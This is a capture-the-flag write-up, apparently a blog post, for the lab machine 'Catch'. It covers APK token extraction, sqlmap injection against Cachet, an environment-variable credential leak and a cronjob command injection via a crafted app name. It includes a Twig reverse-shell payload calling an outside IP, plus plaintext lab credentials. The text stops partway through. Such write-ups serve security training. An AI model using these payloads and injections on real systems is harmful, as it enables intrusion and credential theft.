## Summary 
This box was a very interesting box centered around a little `.apk`{: .filepath} forensics as well as building valid and signed apks. We used api tokens found in the decompiled apk to access a let's chat API, which gave us credentials to the Cachet service. This service was vulnerable to multiple CVE's, however one could be used to leak credentials which was then used to sign into the box via ssh. Once this was done a cronjob was discovered which ran vulnerable code as root every 5 minutes or so. Exploiting this code via an apk with a malicious name resulted in code execution, giving us root access.  

## Foothold

We first start out by doing a port scan
```console

```
When we browse to the web application hosted on port 80 we are greeted with the website for Catch Global Systems

![The welcome page for the application hosted on port 80](port80.png)

A quick look around quickly shows that basically no funtionality is implemented on this page, except the download function.

Clicking the bright orange button lets us download an apk file name catchv1.0.apk

I'll use apktool to decode the apk. After decoding the apk we can take a look at the strings.xml file. The file can be found at the path `catchv1.0/res/values/strings.xml`{: .filepath}. Below are some interesting strings:
```
<?xml version="1.0" encoding="utf-8"?>
<resources>
	--SNIP---
    <string name="app_name">Catch</string>
    <string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
    <string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
    <string name="slack_token">xoxp-23984754863-2348975623103</string>
    ---SNIP---
</resources>
```
{: file="catchv1.0/res/values/strings.xml"}
As can be seen above, we now have some tokens that we can use to access the `Let's Chat`, `Gitea` and `slack` services used by the developers of the apk presumably. In fact, the machine hosts a `gitea` service on port 3000, a `Let's Chat` service on port 5000 and a `Cachet` service on port 8000. 

Let's chat provides a REST-like API, more can be found [here](https://github.com/sdelements/lets-chat/wiki/API) and the same goes for [Gitea](https://docs.gitea.io/en-us/api-usage/)

Moreover, the Cachet service has had multiple CVE's disclosed at this time. I couldn't find any version number anywhere, but i found some promising exploits in this [blogpost](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/). All required an authenticated user however, which i did not have. The blogpost however links to other exploits which can achieve this, including an SQL injection vulnerability in older Cachet versions. A POC for CVE-2021-39165 can be found [here](https://github.com/W0rty/CVE-2021-39165).

![The Cachet page](cachet.png)

The POC is quite limitied sadly, however it is quite simple to use SQLmap to exploit the vulnerability. 

`sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1%5B0%5D=&1%5B1%5D=a&1%5B2%5D=&1%5B3%5D=or%201=1)*+--+-" --tables --level=5 --risk=3`
The * is used to show SQLmap where it should inject payloads.

Below is relevant output:
```console
[19:03:44] [INFO] retrieved: 5
[19:03:45] [INFO] retrieved: information_schema
[19:03:56] [INFO] retrieved: cachet

[19:07:25] [INFO] retrieved: 25
---SNIP---
[19:09:30] [INFO] retrieved: users
```
Command for dumping columns from the users table in the cachet database:
`sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1%5B0%5D=&1%5B1%5D=a&1%5B2%5D=&1%5B3%5D=or%201=1)*+--+-" --columns -D cachet -T users --level=5 --risk=3`

relevant output:
```console
+-------------------+------------------+

| level             | tinyint(4)       |
| active            | tinyint(1)       |

| welcomed          | tinyint(1)       |
+-------------------+------------------+
```
The interesting columns are username, password and api_key, so let's dump those values as well.

`sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1%5B0%5D=&1%5B1%5D=a&1%5B2%5D=&1%5B3%5D=or%201=1)*+--+-" --dump -D cachet -T users -C "username,password,api_key" --level=5 --risk=3`
```console
+----------+--------------------------------------------------------------+----------------------+
| username | password                                                     | api_key              |
+----------+--------------------------------------------------------------+----------------------+

+----------+--------------------------------------------------------------+----------------------+
```
Let's try to crack these hashes with hashcat. In the meantime we can check out the other services that we got tokens for via the apk.

Let's check out available rooms on Let's chat:

`curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://catch.htb:5000/rooms`

Based on these messages, we now have access to the john user on the cachet status page. We will also probably not be able to crack those passwords we retrieved earlier based on the one we can see in this thread. 

`john:E}V!mywu_69T4C}W`

We now have both the api key and password for the john user. Let's check out what we can do with cachet.

![The cachet dashboard](dashboard.png)

Under the incident template tab i found Cachet helpfully tells us that we can use the Twig templating language:

![The incident template tab](twigtemplate.png)

Based on PayloadAllTheThings, Twig template injections aiming to achieve code execution take the following form:
{% raw %}
`{{['id']|filter('system')}}`
{% endraw %}
We can then create a reverse shell payload: 
{% raw %}
`{{["bash -c 'sh -i >& /dev/tcp/10.10.17.182/1337 0>&1'"]|filter('system')}}`
{% endraw %}
Once we have created the template, we can report a incident via the incidents tab, however for some reason i could not get a reverse shell on the target system, even though the string {% raw %}`{{7*7}}`{% endraw %} evaluated to 49.
Instead i returned to the cachet vulnerabilities referred to earlier. Since I have an authenticated user, I can perform an exploit of CVE-2021-39172. Reading about the exploit, it apparently revolves around being able to access the .env file when changing the mail configuration. The .env file can then be altered in a way so as it points to some remote redis server, and when the system tries to communicate with this redis server, code is deserialized resulting in code execution. Another option is to read the documentation for Cachet <https://docs.cachethq.io/docs/installing-cachet>

Here we see what a normal environment will look like: 
```console
APP_ENV=production
APP_DEBUG=false
APP_URL=http://localhost
APP_KEY=SomeRandomString

DB_DRIVER=mysql
DB_HOST=localhost
DB_DATABASE=cachet
DB_USERNAME=homestead
DB_PASSWORD=secret
DB_PORT=null
---SNIP---
```
Since we can access the environment of the system I will simply steal the DB credentials. It was a little unreliable, but submitting `${DB_PASSWORD}` and `${DB_USERNAME}` in the mail from adress field in the form leaked the variables, and we now have the credentials `will:s2#4Fg0_%3!`

![Leaking environment variables via CVE-2021-39172](envleak.png)

## Privilege escalation

Once we ssh into Will's account on the box, it is usually a good idea to make some noise and make a lot of scans (obviuosly a terrible idea in real life). Linpeas doesn't show up with anything interesting, but pspy does:
```console
---SNIP---
2022/06/16 16:49:01 CMD: UID=0    PID=511329 | /bin/bash /opt/mdm/verify.sh 
2022/06/16 16:49:01 CMD: UID=0    PID=511332 | openssl rand -hex 12 
2022/06/16 16:49:01 CMD: UID=0    PID=511333 | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/716caef605aa7ce857722e6c.apk

---SNIP---
```
We can see that root runs a script /opt/mdm/verify.sh pretty often. Let's take a look.

The contents of the script
```bash

```
For every `.apk`{: .filepath} in the `/opt/mdm/apk_bin`{: .filepath} folder, the script will run some operations on the apk bound to that name. The interesting functionality is in the app_check() function, especially line 46. The script runs the command sh -c 'mkdir APP_NAME', as long as the name contains Catch. This means that if we name our app `Catch;Some_command` we can inject arbitrary commands into the script which will then be run as root. 

The APP_NAME variable gets taken from the strings.xml file within the apk. Furthermore, we also need to sign the apk, since the script checks if the apk is signed and exits if not. 

The easiest way to get the flag is to simply rename the apk we downloaded earlier in the strings.xml file to: 

`Catch; cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt`

This will copy the flag to /tmp and make it readable.

I built the apk using apktool: 

`java -jar apktool_2.6.1.jar b catchv1.0`

And then signed it via uber-apk-signer. Once this was done i moved it into the apk_bin folder and waited with pspy:
